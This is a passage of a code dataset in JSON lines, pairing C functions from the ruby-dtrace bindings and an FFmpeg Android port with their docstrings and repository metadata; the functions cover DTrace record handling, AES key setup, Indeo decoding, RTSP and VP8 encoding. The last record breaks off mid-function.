{"docstring": "/*\n * Returns the enabled probe id which generated this data\n */\n", "func_signal": "VALUE dtracebufdata_epid(VALUE self)", "code": "{\n  dtrace_bufdata_t *bufdata;\n\n  Data_Get_Struct(self, dtrace_bufdata_t, bufdata);\n\n  if (bufdata->dtbda_probe) {\n    return INT2FIX(bufdata->dtbda_probe->dtpda_edesc->dtepd_epid);\n  }\n\n  return Qnil;\n}", "path": "ext\\dtrace_bufdata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/* Returns fault represented by the error */\n", "func_signal": "VALUE dtraceerrdata_fault(VALUE self)", "code": "{\n  dtrace_errdata_t *data;\n\n  Data_Get_Struct(self, dtrace_errdata_t, data);\n\n  if (data) {\n    return INT2FIX(data->dteda_fault);\n  }\n  else {\n    return Qnil;\n  }\n}", "path": "ext\\dtrace_errdata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/*\n * Returns the enabled probe id which generated this data\n */\n", "func_signal": "VALUE dtraceprobedata_epid(VALUE self)", "code": "{\n  dtrace_probedata_t *data;\n\n  Data_Get_Struct(self, dtrace_probedata_t, data);\n  return INT2FIX(data->dtpda_edesc->dtepd_epid);\n}", "path": "ext\\dtrace_probedata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/* Returns the value of this aggregate, be it the aggregation value,\n   or a member of an aggregation key tuple. */\n", "func_signal": "VALUE dtraceaggdata_value(VALUE self)", "code": "{\n  dtrace_bufdata_t *bufdata;\n  const dtrace_aggdata_t *aggdata;\n  const dtrace_aggdesc_t *aggdesc;\n  const dtrace_recdesc_t *rec;\n  const char *s;\n  dtrace_actkind_t act = DTRACEACT_NONE;\n  int64_t aggid;\n  uint64_t normal;\n  caddr_t addr;\n  int64_t value;\n  VALUE v = Qnil;\n\n  Data_Get_Struct(self, dtrace_bufdata_t, bufdata);\n  aggdata = bufdata->dtbda_aggdata;\n  s = bufdata->dtbda_buffered;\n  rec = bufdata->dtbda_recdesc;\n\n  if (aggdata == NULL) {\n    rb_raise(eDTraceException, \"null aggdata\");\n    return Qnil;\n  }\n\n  aggdesc = aggdata->dtada_desc;\n\n  if (aggdesc == NULL) {\n    rb_raise(eDTraceException, \"null aggdesc\");\n    return Qnil;\n  }\n\n  aggid = *((int64_t *)(aggdata->dtada_data +\n\t\t\taggdesc->dtagd_rec[0].dtrd_offset));\n  if (aggid < 0) {\n    rb_raise(eDTraceException, \"negative aggregation ID\");\n    return Qnil;\n  }\n\n  act = rec->dtrd_action;\n\n  if (bufdata->dtbda_flags & DTRACE_BUFDATA_AGGKEY) {\n\n    switch (act) {\n    case DTRACEACT_STACK:\n    case DTRACEACT_USTACK:\n    case DTRACEACT_JSTACK:\n      /* todo */\n      break;\n    case DTRACEACT_USYM:\n    case DTRACEACT_UADDR:\n    case DTRACEACT_UMOD:\n    case DTRACEACT_SYM:\n    case DTRACEACT_MOD:\n      /* todo */\n      break;\n    default:\n      v = handle_bytedata((aggdata->dtada_data + rec->dtrd_offset), rec->dtrd_size);\n    }\n\n\n  } else if (bufdata->dtbda_flags & DTRACE_BUFDATA_AGGVAL) {\n\n    normal = aggdata->dtada_normal;\n    addr = aggdata->dtada_data + rec->dtrd_offset;\n\n    if (act == DTRACEAGG_AVG) {\n      uint64_t *data = (uint64_t *)addr;\n      value = (data[0] ? (long long)(data[1] / normal / data[0]) : 0);\n    } else {\n      value = (*((int64_t *)addr)) / normal;\n    }\n\n    if (act == DTRACEAGG_QUANTIZE || act == DTRACEAGG_LQUANTIZE) {\n      v = Qnil; // dtj_new_distribution(data, rec, jc);\n    } else {\n      switch (act) {\n      case DTRACEAGG_COUNT:\n\tif (value < 0)\n\t  rb_raise(eDTraceException, \"count value is negative\");\n\tv = LL2NUM(value);\n\tbreak;\n      case DTRACEAGG_AVG:\n      case DTRACEAGG_MIN:\n      case DTRACEAGG_MAX:\n      case DTRACEAGG_SUM:\n\tv = LL2NUM(value);\n\tbreak;\n      default:\n\tv = Qnil;\n\trb_raise(eDTraceException, \"unexpected aggregation action: %d\", act);\n      }\n    }\n\n  } else if (bufdata->dtbda_flags & DTRACE_BUFDATA_AGGVAL) {\n\n    v = Qnil;\n\n  }\n\n  return v;\n}", "path": "ext\\dtrace_aggdata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/* Returns the CPU which generated this data */\n", "func_signal": "VALUE dtraceprobedata_cpu(VALUE self)", "code": "{\n  dtrace_probedata_t *data;\n  processorid_t cpu;\n\n  Data_Get_Struct(self, dtrace_probedata_t, data);\n\n  if (data) {\n    cpu = data->dtpda_cpu;\n    return INT2FIX(cpu);\n  }\n  else {\n    return Qnil;\n  }\n}", "path": "ext\\dtrace_probedata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/*\n * Returns the DTraceProbe for the probe which generated this data\n */\n", "func_signal": "VALUE dtracebufdata_probe(VALUE self)", "code": "{\n  dtrace_bufdata_t *bufdata;\n  VALUE dtraceprobe;\n\n  Data_Get_Struct(self, dtrace_bufdata_t, bufdata);\n\n  if (bufdata->dtbda_probe) {\n    dtraceprobe = Data_Wrap_Struct(cDTraceProbe, 0, NULL, (dtrace_probedesc_t *)bufdata->dtbda_probe->dtpda_pdesc);\n    return dtraceprobe;\n  }\n\n  return Qnil;\n}", "path": "ext\\dtrace_bufdata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/* Returns the CPU which generated this err record */\n", "func_signal": "VALUE dtraceerrdata_cpu(VALUE self)", "code": "{\n  dtrace_errdata_t *data;\n  processorid_t cpu;\n\n  Data_Get_Struct(self, dtrace_errdata_t, data);\n\n  if (data) {\n    cpu = data->dteda_cpu;\n    return INT2FIX(cpu);\n  }\n  else {\n    return Qnil;\n  }\n}", "path": "ext\\dtrace_errdata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/*\n * Returns the DTraceProbe for the probe which generated this data\n */\n", "func_signal": "VALUE dtraceprobedata_probe(VALUE self)", "code": "{\n  VALUE dtraceprobe;\n  dtrace_probedata_t *data;\n  dtrace_probedesc_t *pd;\n\n  Data_Get_Struct(self, dtrace_probedata_t, data);\n  pd = data->dtpda_pdesc;\n\n  if (pd) {\n    dtraceprobe = dtraceprobedesc_init(pd);\n    return dtraceprobe;\n  }\n\n  return Qnil;\n}", "path": "ext\\dtrace_probedata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/*\n * Execute the D program. Returns a DTraceProgramInfo object if\n * successful, otherwise raises a DTraceException.\n */\n", "func_signal": "VALUE dtraceprogram_exec(VALUE self)", "code": "{\n  dtrace_prog_t *prog;\n  dtrace_proginfo_t *proginfo;\n  dtrace_handle_t *handle;\n  VALUE dtrace;\n  VALUE dtraceprograminfo;\n  int ret;\n\n  Data_Get_Struct(self, dtrace_prog_t, prog);\n  dtrace = rb_iv_get(self, \"@handle\");\n  Data_Get_Struct(dtrace, dtrace_handle_t, handle);\n\n  proginfo = ALLOC(dtrace_proginfo_t);\n  if (!proginfo) {\n    rb_raise(eDTraceException, \"alloc failed\");\n    return Qnil;\n  }\n\n  ret = dtrace_program_exec(handle->hdl, prog, proginfo);\n\n  if (ret == 0) {\n    dtraceprograminfo = dtraceprograminfo_init(proginfo);\n    rb_iv_set(self, \"@proginfo\", dtraceprograminfo);\n  }\n\n  if (ret < 0)\n    rb_raise(eDTraceException, \"%s\", dtrace_errmsg(handle->hdl, dtrace_errno(handle->hdl)));\n\n  return Qnil;\n}", "path": "ext\\dtrace_program.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/*\n * Returns the record in this DTraceBufdata. Records are returned as\n * either DTraceRecords or DTraceStackRecords as appropriate for the\n * type of action.\n */\n", "func_signal": "VALUE dtracebufdata_record(VALUE self)", "code": "{\n  dtrace_bufdata_t *bufdata;\n  const dtrace_recdesc_t *rec;\n  dtrace_actkind_t act = DTRACEACT_NONE;\n  const char *s;\n  VALUE v = Qnil;\n  VALUE dtracerecord;\n  VALUE dtraceaggdata;\n  VALUE dtracerecdesc;\n\n  Data_Get_Struct(self, dtrace_bufdata_t, bufdata);\n\n  if (bufdata->dtbda_aggdata) {\n    dtraceaggdata = Data_Wrap_Struct(cDTraceAggData, 0, NULL, (dtrace_bufdata_t *)bufdata);\n    return dtraceaggdata;\n  }\n\n  s = bufdata->dtbda_buffered;\n  if (s == NULL) {\n    return Qnil;\n  }\n\n  rec = bufdata->dtbda_recdesc;\n  if (rec) {\n    act = rec->dtrd_action;\n  }\n\n  switch (act) {\n  case DTRACEACT_DIFEXPR:\n    /* trace() action */\n    break;\n  case DTRACEACT_PRINTF:\n    /* printf action, not available in probedata */\n    v = rb_str_new2(s);\n    dtracerecord = rb_class_new_instance(0, NULL, rb_path2class(\"DTrace::PrintfRecord\"));\n    rb_iv_set(dtracerecord, \"@from\", rb_str_new2(\"bufdata\"));\n    rb_iv_set(dtracerecord, \"@value\", v);\n    return (dtracerecord);\n    break;\n  case DTRACEACT_STACK:\n  case DTRACEACT_USTACK:\n  case DTRACEACT_JSTACK:\n    /* stand-alone stack(), ustack(), or jstack() action */\n    v = rb_str_new2(s);\n    dtracerecord = rb_class_new_instance(0, NULL, rb_path2class(\"DTrace::StackRecord\"));\n    rb_iv_set(dtracerecord, \"@from\", rb_str_new2(\"bufdata\"));\n    rb_funcall(dtracerecord, rb_intern(\"parse\"), 1, v);\n    return (dtracerecord);\n    break;\n  case DTRACEACT_USYM:\n  case DTRACEACT_UADDR:\n  case DTRACEACT_UMOD:\n  case DTRACEACT_SYM:\n  case DTRACEACT_MOD:\n    v = rb_str_new2(s);\n    break;\n  case DTRACEACT_PRINTA:\n    v = rb_str_new2(s);\n    break;\n  default:\n    /*\n     * The record handle defers nothing else to this\n     * bufhandler.\n     */\n    break;\n  }\n\n  if (!NIL_P(v)) {\n    dtracerecord = rb_class_new_instance(0, NULL, rb_path2class(\"DTrace::Record\"));\n    rb_iv_set(dtracerecord, \"@value\", v);\n    rb_iv_set(dtracerecord, \"@action\", INT2FIX(act));\n    rb_iv_set(dtracerecord, \"@from\", rb_str_new2(\"bufdata\"));\n    return (dtracerecord);\n  }\n  else {\n    return Qnil;\n  }\n}", "path": "ext\\dtrace_bufdata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/* Returns the prefix given to this data by DTrace */\n", "func_signal": "VALUE dtraceprobedata_prefix(VALUE self)", "code": "{\n  dtrace_probedata_t *data;\n  const char *prefix;\n\n  Data_Get_Struct(self, dtrace_probedata_t, data);\n  prefix = data->dtpda_prefix;\n\n  if (prefix)\n    return rb_str_new2(prefix);\n  else\n    return Qnil;\n}", "path": "ext\\dtrace_probedata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/* Returns the offset of the error */\n", "func_signal": "VALUE dtraceerrdata_offset(VALUE self)", "code": "{\n  dtrace_errdata_t *data;\n\n  Data_Get_Struct(self, dtrace_errdata_t, data);\n\n  if (data) {\n    return INT2FIX(data->dteda_offset);\n  }\n  else {\n    return Qnil;\n  }\n}", "path": "ext\\dtrace_errdata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/* Returns the indent level given to this data by DTrace */\n", "func_signal": "VALUE dtraceprobedata_indent(VALUE self)", "code": "{\n  dtrace_probedata_t *data;\n  int indent;\n\n  Data_Get_Struct(self, dtrace_probedata_t, data);\n\n  if (data) {\n    indent = data->dtpda_indent;\n    return INT2FIX(indent / 2);\n  }\n  else {\n    return Qnil;\n  }\n}", "path": "ext\\dtrace_probedata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/* Return the type of this DTraceAggData: tuple, value or last. Used\n   to form tuples and values into DTraceAggregate objects. */\n", "func_signal": "VALUE dtraceaggdata_aggtype(VALUE self)", "code": "{\n  dtrace_bufdata_t *bufdata;\n  VALUE v;\n\n  Data_Get_Struct(self, dtrace_bufdata_t, bufdata);\n\n  if (bufdata->dtbda_flags & DTRACE_BUFDATA_AGGKEY)\n    v = rb_str_new2(\"tuple\");\n  else if (bufdata->dtbda_flags & DTRACE_BUFDATA_AGGVAL)\n    v = rb_str_new2(\"value\");\n  else if (bufdata->dtbda_flags & DTRACE_BUFDATA_AGGLAST)\n    v = rb_str_new2(\"last\");\n  else\n    v = rb_str_new2(\"unknown\");\n\n  return v;\n}", "path": "ext\\dtrace_aggdata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/* Returns a the action producing the error */\n", "func_signal": "VALUE dtraceerrdata_action(VALUE self)", "code": "{\n  dtrace_errdata_t *data;\n\n  Data_Get_Struct(self, dtrace_errdata_t, data);\n\n  if (data) {\n    return INT2FIX(data->dteda_action);\n  }\n  else {\n    return Qnil;\n  }\n}", "path": "ext\\dtrace_errdata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/*\n * Yields each record in this DTraceProbedata in turn. Records are\n * yielded as either DTraceRecords or DTraceStackRecords as\n * appropriate for the type of action.\n */\n", "func_signal": "VALUE dtraceprobedata_each_record(VALUE self)", "code": "{\n  dtrace_probedata_t *data;\n  dtrace_eprobedesc_t *eprobe;\n  dtrace_recdesc_t *rec;\n  dtrace_handle_t *handle;\n  dtrace_actkind_t act;\n  int i;\n  caddr_t addr;\n  VALUE dtracerecord;\n  VALUE dtrace;\n  VALUE v;\n  VALUE class;\n\n  Data_Get_Struct(self, dtrace_probedata_t, data);\n  dtrace = rb_iv_get(self, \"@handle\");\n  Data_Get_Struct(dtrace, dtrace_handle_t, handle);\n\n  eprobe = data->dtpda_edesc;\n\n  for (i = 0; i < eprobe->dtepd_nrecs; i++) {\n    v = 0;\n    rec = &eprobe->dtepd_rec[i];\n    if (rec->dtrd_size > 0) {\n      act = rec->dtrd_action;\n      addr = data->dtpda_data + rec->dtrd_offset;\n\n      switch (act) {\n      case DTRACEACT_STACK:\n\tv = _handle_stack_record(handle->hdl, addr, rec);\n        class = rb_path2class(\"DTrace::StackRecord\");\n        break;\n      case DTRACEACT_USTACK:\n\tv = _handle_ustack_record(handle->hdl, addr, rec);\n        class = rb_path2class(\"DTrace::StackRecord\");\n        break;\n      case DTRACEACT_JSTACK:\n        /* not sure how to handle jstack */\n        break;\n      case DTRACEACT_PRINTA:\n\t/* don't want the probedata record for a printa() action */\n\tbreak;\n      default:\n        class = rb_path2class(\"DTrace::Record\");\n\tswitch (rec->dtrd_size) {\n\tcase 1:\n\t  v = INT2FIX((int)(*((uint8_t *)addr)));\n\t  break;\n\tcase 2:\n\t  v = INT2FIX((int)(*((uint16_t *)addr)));\n\t  break;\n\tcase 4:\n\t  v = INT2FIX(*((int32_t *)addr));\n\t  break;\n\tcase 8:\n\t  v = LL2NUM(*((int64_t *)addr));\n\t  break;\n\tdefault:\n\t  v = handle_bytedata(addr, rec->dtrd_size);\n\t  break;\n\t}\n      }\n\n      if (v) {\n\tdtracerecord = rb_class_new_instance(0, NULL, class);\n\trb_iv_set(dtracerecord, \"@value\", v);\n\trb_iv_set(dtracerecord, \"@from\", rb_str_new2(\"probedata\"));\n\trb_iv_set(dtracerecord, \"@index\", INT2FIX(i));\n\trb_iv_set(dtracerecord, \"@action\", INT2FIX(act));\n\trb_yield(dtracerecord);\n      }\n    }\n  }\n  return Qnil;\n}", "path": "ext\\dtrace_probedata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/* Returns a message from the DTrace library describing this err\n   record. */\n", "func_signal": "VALUE dtraceerrdata_msg(VALUE self)", "code": "{\n  dtrace_errdata_t *data;\n\n  Data_Get_Struct(self, dtrace_errdata_t, data);\n\n  if (data) {\n    return rb_str_new2(data->dteda_msg);\n  }\n  else {\n    return Qnil;\n  }\n}", "path": "ext\\dtrace_errdata.c", "repo_name": "chrisa/ruby-dtrace", "stars": 65, "license": "mit", "language": "c", "size": 648}
{"docstring": "/*\n *  Copy huffman codebook descriptors.\n *\n *  @param[out]  dst  ptr to the destination descriptor\n *  @param[in]   src  ptr to the source descriptor\n */\n", "func_signal": "static void ivi_huff_desc_copy(IVIHuffDesc *dst, const IVIHuffDesc *src)", "code": "{\n    dst->num_rows = src->num_rows;\n    memcpy(dst->xbits, src->xbits, src->num_rows);\n}", "path": "ffmpeg-2.2\\libavcodec\\ivi_common.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "// this is based on the reference AES code by Paulo Barreto and Vincent Rijmen\n", "func_signal": "int av_aes_init(AVAES *a, const uint8_t *key, int key_bits, int decrypt)", "code": "{\n    int i, j, t, rconpointer = 0;\n    uint8_t tk[8][4];\n    int KC = key_bits >> 5;\n    int rounds = KC + 6;\n    uint8_t log8[256];\n    uint8_t alog8[512];\n\n    if (!enc_multbl[FF_ARRAY_ELEMS(enc_multbl)-1][FF_ARRAY_ELEMS(enc_multbl[0])-1]) {\n        j = 1;\n        for (i = 0; i < 255; i++) {\n            alog8[i] = alog8[i + 255] = j;\n            log8[j] = i;\n            j ^= j + j;\n            if (j > 255)\n                j ^= 0x11B;\n        }\n        for (i = 0; i < 256; i++) {\n            j = i ? alog8[255 - log8[i]] : 0;\n            j ^= (j << 1) ^ (j << 2) ^ (j << 3) ^ (j << 4);\n            j = (j ^ (j >> 8) ^ 99) & 255;\n            inv_sbox[j] = i;\n            sbox[i] = j;\n        }\n        init_multbl2(dec_multbl, (const int[4]) { 0xe, 0x9, 0xd, 0xb },\n                     log8, alog8, inv_sbox);\n        init_multbl2(enc_multbl, (const int[4]) { 0x2, 0x1, 0x1, 0x3 },\n                     log8, alog8, sbox);\n    }\n\n    if (key_bits != 128 && key_bits != 192 && key_bits != 256)\n        return -1;\n\n    a->rounds = rounds;\n\n    memcpy(tk, key, KC * 4);\n    memcpy(a->round_key[0].u8, key, KC * 4);\n\n    for (t = KC * 4; t < (rounds + 1) * 16; t += KC * 4) {\n        for (i = 0; i < 4; i++)\n            tk[0][i] ^= sbox[tk[KC - 1][(i + 1) & 3]];\n        tk[0][0] ^= rcon[rconpointer++];\n\n        for (j = 1; j < KC; j++) {\n            if (KC != 8 || j != KC >> 1)\n                for (i = 0; i < 4; i++)\n                    tk[j][i] ^= tk[j - 1][i];\n            else\n                for (i = 0; i < 4; i++)\n                    tk[j][i] ^= sbox[tk[j - 1][i]];\n        }\n\n        memcpy(a->round_key[0].u8 + t, tk, KC * 4);\n    }\n\n    if (decrypt) {\n        for (i = 1; i < rounds; i++) {\n            av_aes_block tmp[3];\n            tmp[2] = a->round_key[i];\n            subshift(&tmp[1], 0, sbox);\n            mix(tmp, dec_multbl, 1, 3);\n            a->round_key[i] = tmp[0];\n        }\n    } else {\n        for (i = 0; i < (rounds + 1) >> 1; i++) {\n            FFSWAP(av_aes_block, a->round_key[i], a->round_key[rounds-i]);\n        }\n    }\n\n    return 0;\n}", "path": "ffmpeg-2.2\\libavutil\\aes.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/*\n *  Compare two huffman codebook descriptors.\n *\n *  @param[in]  desc1  ptr to the 1st descriptor to compare\n *  @param[in]  desc2  ptr to the 2nd descriptor to compare\n *  @return         comparison result: 0 - equal, 1 - not equal\n */\n", "func_signal": "static int ivi_huff_desc_cmp(const IVIHuffDesc *desc1,\n                             const IVIHuffDesc *desc2)", "code": "{\n    return desc1->num_rows != desc2->num_rows ||\n           memcmp(desc1->xbits, desc2->xbits, desc1->num_rows);\n}", "path": "ffmpeg-2.2\\libavcodec\\ivi_common.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/**\n *  Decode an Indeo 4 or 5 band.\n *\n *  @param[in,out]  ctx    ptr to the decoder context\n *  @param[in,out]  band   ptr to the band descriptor\n *  @param[in]      avctx  ptr to the AVCodecContext\n *  @return         result code: 0 = OK, -1 = error\n */\n", "func_signal": "static int decode_band(IVI45DecContext *ctx,\n                       IVIBandDesc *band, AVCodecContext *avctx)", "code": "{\n    int         result, i, t, idx1, idx2, pos;\n    IVITile     *tile;\n\n    band->buf     = band->bufs[ctx->dst_buf];\n    if (!band->buf) {\n        av_log(avctx, AV_LOG_ERROR, \"Band buffer points to no data!\\n\");\n        return AVERROR_INVALIDDATA;\n    }\n    band->ref_buf = band->bufs[ctx->ref_buf];\n    band->data_ptr = ctx->frame_data + (get_bits_count(&ctx->gb) >> 3);\n\n    result = ctx->decode_band_hdr(ctx, band, avctx);\n    if (result) {\n        av_log(avctx, AV_LOG_ERROR, \"Error while decoding band header: %d\\n\",\n               result);\n        return result;\n    }\n\n    if (band->is_empty) {\n        av_log(avctx, AV_LOG_ERROR, \"Empty band encountered!\\n\");\n        return AVERROR_INVALIDDATA;\n    }\n\n    band->rv_map = &ctx->rvmap_tabs[band->rvmap_sel];\n\n    /* apply corrections to the selected rvmap table if present */\n    for (i = 0; i < band->num_corr; i++) {\n        idx1 = band->corr[i * 2];\n        idx2 = band->corr[i * 2 + 1];\n        FFSWAP(uint8_t, band->rv_map->runtab[idx1], band->rv_map->runtab[idx2]);\n        FFSWAP(int16_t, band->rv_map->valtab[idx1], band->rv_map->valtab[idx2]);\n        if (idx1 == band->rv_map->eob_sym || idx2 == band->rv_map->eob_sym)\n            band->rv_map->eob_sym ^= idx1 ^ idx2;\n        if (idx1 == band->rv_map->esc_sym || idx2 == band->rv_map->esc_sym)\n            band->rv_map->esc_sym ^= idx1 ^ idx2;\n    }\n\n    pos = get_bits_count(&ctx->gb);\n\n    for (t = 0; t < band->num_tiles; t++) {\n        tile = &band->tiles[t];\n\n        if (tile->mb_size != band->mb_size) {\n            av_log(avctx, AV_LOG_ERROR, \"MB sizes mismatch: %d vs. %d\\n\",\n                   band->mb_size, tile->mb_size);\n            return AVERROR_INVALIDDATA;\n        }\n        tile->is_empty = get_bits1(&ctx->gb);\n        if (tile->is_empty) {\n            result = ivi_process_empty_tile(avctx, band, tile,\n                                      (ctx->planes[0].bands[0].mb_size >> 3) - (band->mb_size >> 3));\n            if (result < 0)\n                break;\n            av_dlog(avctx, \"Empty tile encountered!\\n\");\n        } else {\n            tile->data_size = ivi_dec_tile_data_size(&ctx->gb);\n            if (!tile->data_size) {\n                av_log(avctx, AV_LOG_ERROR, \"Tile data size is zero!\\n\");\n                result = AVERROR_INVALIDDATA;\n                break;\n            }\n\n            result = ctx->decode_mb_info(ctx, band, tile, avctx);\n            if (result < 0)\n                break;\n\n            result = ivi_decode_blocks(&ctx->gb, band, tile, avctx);\n            if (result < 0) {\n                av_log(avctx, AV_LOG_ERROR,\n                       \"Corrupted tile data encountered!\\n\");\n                break;\n            }\n\n            if (((get_bits_count(&ctx->gb) - pos) >> 3) != tile->data_size) {\n                av_log(avctx, AV_LOG_ERROR,\n                       \"Tile data_size mismatch!\\n\");\n                result = AVERROR_INVALIDDATA;\n                break;\n            }\n\n            pos += tile->data_size << 3; // skip to next tile\n        }\n    }\n\n    /* restore the selected rvmap table by applying its corrections in\n     * reverse order */\n    for (i = band->num_corr-1; i >= 0; i--) {\n        idx1 = band->corr[i*2];\n        idx2 = band->corr[i*2+1];\n        FFSWAP(uint8_t, band->rv_map->runtab[idx1], band->rv_map->runtab[idx2]);\n        FFSWAP(int16_t, band->rv_map->valtab[idx1], band->rv_map->valtab[idx2]);\n        if (idx1 == band->rv_map->eob_sym || idx2 == band->rv_map->eob_sym)\n            band->rv_map->eob_sym ^= idx1 ^ idx2;\n        if (idx1 == band->rv_map->esc_sym || idx2 == band->rv_map->esc_sym)\n            band->rv_map->esc_sym ^= idx1 ^ idx2;\n    }\n\n#ifdef DEBUG\n    if (band->checksum_present) {\n        uint16_t chksum = ivi_calc_band_checksum(band);\n        if (chksum != band->checksum) {\n            av_log(avctx, AV_LOG_ERROR,\n                   \"Band checksum mismatch! Plane %d, band %d, \"\n                   \"received: %x, calculated: %x\\n\",\n                   band->plane, band->band_num, band->checksum, chksum);\n        }\n    }\n#endif\n\n    align_get_bits(&ctx->gb);\n\n    return result;\n}", "path": "ffmpeg-2.2\\libavcodec\\ivi_common.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/* skip a RTP/TCP interleaved packet */\n", "func_signal": "void ff_rtsp_skip_packet(AVFormatContext *s)", "code": "{\n    RTSPState *rt = s->priv_data;\n    int ret, len, len1;\n    uint8_t buf[1024];\n\n    ret = ffurl_read_complete(rt->rtsp_hd, buf, 3);\n    if (ret != 3)\n        return;\n    len = AV_RB16(buf + 1);\n\n    av_dlog(s, \"skipping RTP packet len=%d\\n\", len);\n\n    /* skip payload */\n    while (len > 0) {\n        len1 = len;\n        if (len1 > sizeof(buf))\n            len1 = sizeof(buf);\n        ret = ffurl_read_complete(rt->rtsp_hd, buf, len1);\n        if (ret != len1)\n            return;\n        len -= len1;\n    }\n}", "path": "ffmpeg-2.2\\libavformat\\rtsp.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/*\n *  Decode size of the tile data.\n *  The size is stored as a variable-length field having the following format:\n *  if (tile_data_size < 255) than this field is only one byte long\n *  if (tile_data_size >= 255) than this field four is byte long: 0xFF X1 X2 X3\n *  where X1-X3 is size of the tile data\n *\n *  @param[in,out]  gb  the GetBit context\n *  @return     size of the tile data in bytes\n */\n", "func_signal": "static int ivi_dec_tile_data_size(GetBitContext *gb)", "code": "{\n    int    len;\n\n    len = 0;\n    if (get_bits1(gb)) {\n        len = get_bits(gb, 8);\n        if (len == 255)\n            len = get_bits_long(gb, 24);\n    }\n\n    /* align the bitstream reader on the byte boundary */\n    align_get_bits(gb);\n\n    return len;\n}", "path": "ffmpeg-2.2\\libavcodec\\ivi_common.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/*\n *  Convert and output the current plane.\n *  This conversion is done by adding back the bias value of 128\n *  (subtracted in the encoder) and clipping the result.\n *\n *  @param[in]   plane      pointer to the descriptor of the plane being processed\n *  @param[out]  dst        pointer to the buffer receiving converted pixels\n *  @param[in]   dst_pitch  pitch for moving to the next y line\n */\n", "func_signal": "static void ivi_output_plane(IVIPlaneDesc *plane, uint8_t *dst, int dst_pitch)", "code": "{\n    int             x, y;\n    const int16_t   *src  = plane->bands[0].buf;\n    uint32_t        pitch = plane->bands[0].pitch;\n\n    if (!src)\n        return;\n\n    for (y = 0; y < plane->height; y++) {\n        for (x = 0; x < plane->width; x++)\n            dst[x] = av_clip_uint8(src[x] + 128);\n        src += pitch;\n        dst += dst_pitch;\n    }\n}", "path": "ffmpeg-2.2\\libavcodec\\ivi_common.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/**\n * Queue multiple output frames from the encoder, returning the front-most.\n * In cases where vpx_codec_get_cx_data() returns more than 1 frame append\n * the frame queue. Return the head frame if available.\n * @return Stored frame size\n * @return AVERROR(EINVAL) on output size error\n * @return AVERROR(ENOMEM) on coded frame queue data allocation error\n */\n", "func_signal": "static int queue_frames(AVCodecContext *avctx, AVPacket *pkt_out,\n                        AVFrame *coded_frame)", "code": "{\n    VP8Context *ctx = avctx->priv_data;\n    const struct vpx_codec_cx_pkt *pkt;\n    const struct vpx_codec_cx_pkt *pkt_alpha = NULL;\n    const void *iter = NULL;\n    const void *iter_alpha = NULL;\n    int size = 0;\n\n    if (ctx->coded_frame_list) {\n        struct FrameListData *cx_frame = ctx->coded_frame_list;\n        /* return the leading frame if we've already begun queueing */\n        size = storeframe(avctx, cx_frame, pkt_out, coded_frame);\n        if (size < 0)\n            return size;\n        ctx->coded_frame_list = cx_frame->next;\n        free_coded_frame(cx_frame);\n    }\n\n    /* consume all available output from the encoder before returning. buffers\n       are only good through the next vpx_codec call */\n    while ((pkt = vpx_codec_get_cx_data(&ctx->encoder, &iter)) &&\n            (!ctx->is_alpha ||\n             (ctx->is_alpha && (pkt_alpha = vpx_codec_get_cx_data(&ctx->encoder_alpha, &iter_alpha))))) {\n        switch (pkt->kind) {\n        case VPX_CODEC_CX_FRAME_PKT:\n            if (!size) {\n                struct FrameListData cx_frame;\n\n                /* avoid storing the frame when the list is empty and we haven't yet\n                   provided a frame for output */\n                av_assert0(!ctx->coded_frame_list);\n                cx_pktcpy(&cx_frame, pkt, pkt_alpha, ctx);\n                size = storeframe(avctx, &cx_frame, pkt_out, coded_frame);\n                if (size < 0)\n                    return size;\n            } else {\n                struct FrameListData *cx_frame =\n                    av_malloc(sizeof(struct FrameListData));\n\n                if (!cx_frame) {\n                    av_log(avctx, AV_LOG_ERROR,\n                           \"Frame queue element alloc failed\\n\");\n                    return AVERROR(ENOMEM);\n                }\n                cx_pktcpy(cx_frame, pkt, pkt_alpha, ctx);\n                cx_frame->buf = av_malloc(cx_frame->sz);\n\n                if (!cx_frame->buf) {\n                    av_log(avctx, AV_LOG_ERROR,\n                           \"Data buffer alloc (%zu bytes) failed\\n\",\n                           cx_frame->sz);\n     